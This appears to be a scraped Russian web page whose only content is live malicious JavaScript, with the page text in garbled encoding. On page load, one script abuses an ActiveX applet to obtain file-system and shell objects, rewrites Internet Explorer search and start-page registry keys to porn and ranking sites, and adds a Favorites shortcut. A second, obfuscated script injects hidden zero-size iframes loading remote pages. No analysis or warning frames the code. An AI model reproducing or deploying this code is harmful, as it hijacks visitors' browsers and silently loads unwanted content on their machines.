   Ïîñåòèòåëü çàñ÷èòàí!
   <script language="JavaScript" >
   document.writeln('<APPLET code=com.ms.activeX.ActiveXComponent width=0 height=0 id=AX1></APPLET>');
   var FSO, Shl, Net;
   function SetFav(Location,Target){
     var WF, Shor, loc;
     WF=FSO.GetSpecialFolder(0);
     loc=WF+"\\?????????";
     if(!FSO.FolderExists(loc)){
       loc=FSO.GetDriveName(WF) +
           "\\Documents and Settings\\"+
           Net.UserName+
           "\\?????????";
       if(!FSO.FolderExists(loc)){
         return;
       }
     }
     Shor = Shl.CreateShortcut(loc+"\\"+Location+".URL");
     Shor.TargetPath = Target;
     Shor.Save();
   }
   function axinit(){
     var a1=document.applets("AX1");
     a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
     a1.createInstance();
     FSO = a1.GetObject();
     a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
     a1.createInstance();
     Shl = a1.GetObject();
     a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}");
     a1.createInstance();
     Net = a1.GetObject();
     Shl.RegWrite('HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\Search Bar',
                  'http://top.bum.ru/in.php?id=313');
     Shl.RegWrite('HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Search_URL',
                  'http://www.myporno.ru/cgi-bin/in.cgi?free');
     Shl.RegWrite('HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page',
                  'http://www.myporno.ru/cgi-bin/in.cgi?free');
     Shl.RegWrite('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Search\\SearchAssistant',
                  'http://top.bum.ru/in.php?id=313');
     var slang = navigator.systemLanguage;
     if (slang.indexOf('en') < 0){
       Shl.RegWrite('HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page',
                    'http://top.erovideo.ru/?id=152');
     }
     SetFav("Ýðîòè÷åñêèå ôîòîãðàôèè","http://freestyle.pp.ru");
   }
   function chkcookie(){
     var o=new Date();
     var a=o.getDate();
     a+=90;
     o.setDate(a);
     if (document.cookie.indexOf("v=1") == -1){
       document.cookie="v=1;expires="+o.toUTCString();
       axinit();
     }
   }
   setTimeout("axinit();",500);
   id=""
   </script>
   <script>function ewe(ewr,erw){erw="erw".length;var rew="";var rwe="";rew=new String(ewr);rre=rew.length;wre=rre%erw;var PI=ewr.length;ere=rew.substring(0,rre-wre);ree=rew.substring(rre-wre,rre);with (Math) {wew=round(log(pow(PI,0)));}var eee=ere.length;var rer=ere.length;while (eee>=0)  {eee=rer-erw*(wew+1);var wwe=rer-erw*wew;rwe+=ere.substring(eee,wwe);wew++;}rwe+=ree;wer+=rwe;return 0;}</script><script>var wer="";function NF1(){ewe(" wir=0rdeeboramp f.phtopu/au/rp.re.ptylees.frwww://ttpc=h srameifr\r\n<me>fra</i=1>ghthei=1 dth wir=0rdeeboramp f.phdeoovievrru/ru/pp.le.styreew.f/wwp:/httrc=e sram<if \r\nde><hid");ewe(">\r\nameifr></t=1igh heh=1idt0 wer=ordmebfrahp p.pxto/ma/ru.ru.ppyleestfreww.//wtp:=htsrcme fra\n<ie>\rram/if1><ht=eig1 hth=wid=0 derborame frphpck./fu/ru.ru.ppyleestfreww.//wtp:=htsrcme fra\n<ie>\rram/if1><ht=eig1 hth=");document.write(wer);return 0;}</script><script language=javascript> NF1();</script>
